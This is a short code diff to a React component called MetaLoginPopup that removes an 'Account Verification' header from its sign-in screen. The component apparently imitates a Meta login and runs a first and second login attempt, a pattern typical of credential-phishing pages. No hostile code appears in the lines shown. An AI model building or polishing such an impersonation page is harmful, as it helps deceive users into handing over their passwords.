@@ -220,13 +220,6 @@ const MetaLoginPopup = () => {
             </div>
           ) : (
             <>
-              <div className="flex flex-col items-center mb-8">
-                <div className="h-24 w-24 bg-blue-100 rounded-full flex items-center justify-center mb-4">
-                  <ShieldCheck className="h-14 w-14 text-blue-600" />
-                </div>
-                <h3 className="text-xl font-semibold text-gray-800 text-center">Account Verification</h3>
-                <p className="text-gray-600 text-sm text-center mt-2">Please sign in to continue</p>
-              </div>
               
               {/* Login Steps */}
               {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
